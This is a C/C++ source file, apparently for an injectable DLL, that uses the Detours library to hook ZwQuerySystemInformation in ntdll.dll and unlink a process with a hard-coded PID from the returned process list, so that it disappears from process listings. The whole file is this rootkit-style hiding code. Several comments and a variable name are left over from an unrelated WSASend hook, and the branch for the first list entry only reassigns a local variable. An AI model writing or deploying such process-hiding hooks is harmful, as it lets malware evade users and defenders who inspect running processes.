#include "pch.h"


VOID ShowError(PCHAR msg);
DWORD WINAPI ThreadProc(LPVOID lpParameter);
DWORD GetPid(PCHAR pProName); //根据进程名获取要隐藏的进程的PID

DWORD g_dwOrgAddr = 0;   //原函数地址
CHAR g_szOrgBytes[5] = { 0 };  //保存函数的前五个字节
DWORD g_dwHidePID = 15460;   //要隐藏的进程的PID
// 定义函数指针类型，用于保存原始的 wsasend 函数
typedef
NTSTATUS
(WINAPI* pfnZwQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

// 声明原始的 wsasend 函数指针
pfnZwQuerySystemInformation RealWsaSend = NULL;

// 自定义的 HookedWsaSend 函数
NTSTATUS WINAPI MyZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status = 0;
	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;
	pfnZwQuerySystemInformation dwOrgFuncAddr = 0;


	//获取函数地址
	dwOrgFuncAddr = RealWsaSend;



	status = ((pfnZwQuerySystemInformation)dwOrgFuncAddr)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	//判断函数是否调用成功，以及是否是查询进程的操作
	if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			//判断是否是要隐藏的进程
			if (g_dwHidePID == (DWORD)pCur->UniqueProcessId)
			{
				//将进程隐藏起来
				if (pPrev == NULL)   SystemInformation = (PBYTE)pCur + pCur->NextEntryOffset;
				else if (pCur->NextEntryOffset == 0) pPrev->NextEntryOffset = 0;
				else pPrev->NextEntryOffset += pCur->NextEntryOffset;
				break;
			}
			else pPrev = pCur;

			//如果没有下一个成功则退出 
			if (pCur->NextEntryOffset == 0) break;

			//将指针指向下一个成员
			pCur = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pCur + pCur->NextEntryOffset);
		}
	}
	//重新HOOK
	return status;
}

void HookZwQuerySystemInformation() {
	//MessageBox(NULL, "This Is From Dll!\nInject Success!", "OK", MB_OK);
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());

	// 获取原始 wsasend 函数的地址
	RealWsaSend = (pfnZwQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwQuerySystemInformation");

	// 对 wsasend 函数进行 Hook，将其替换为自定义的 HookedWsaSend 函数
	DetourAttach(&(PVOID&)RealWsaSend, MyZwQuerySystemInformation);

	// 完成 Hook 事务
	DetourTransactionCommit();
}